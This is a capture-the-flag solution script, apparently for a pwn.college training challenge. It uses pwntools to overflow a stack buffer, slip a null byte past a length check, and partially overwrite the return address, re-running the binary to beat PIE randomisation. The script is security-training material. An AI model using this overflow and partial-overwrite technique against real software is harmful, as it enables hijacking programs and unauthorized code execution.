#!/usr/bin/python3
from pwn import *

# Retrieve the ELF information from the binary
elf = ELF('/challenge/babymem_level8.0')

# Set the first two bytes to use in the return address
win_address = b'\x71\x17'

# Set the buffer offset from the return address
# NOTE: this value is obtained using Ghidra
buffer_offset = 0x48

# NOTE: because the binary uses PIE (Positional Independent Execution) we have to
#       try multiple times until the win_authed function will be loaded in our guessed
#       address.
#       This can be done because the addresses are aligned 0x1000, then the first 3 nibbles
#       are fixed and the 4th changes at every time execution.
while True:
    # Run the program
    io = elf.process()

    # Send the payload size to the program
    io.recvuntil(b'Payload size: ')
    io.sendline(f"{buffer_offset + 2}".encode())

    # Build and send the payload to the program
    # NOTE: because the payload is first loaded into the heap and then
    #       copied inside the buffer on the stack by a memcpy checking
    #       if the size of the buffer is <= then the buffer length, 
    #       we setup the payload with a string terminator character at the
    #       beginning to avoid the check.
    PAYLOAD = b'\x00' + b'A'*(buffer_offset - 1) + win_address
    io.recvuntil(b'bytes)!')
    io.sendline(PAYLOAD)

    # Retrieve the possible flag
    io.recvuntil(b'Goodbye!')
    flag = io.recvall().decode()

    # Check if the flag has been retrieved correctly
    if 'pwn.college' in flag:
        print(flag)
        break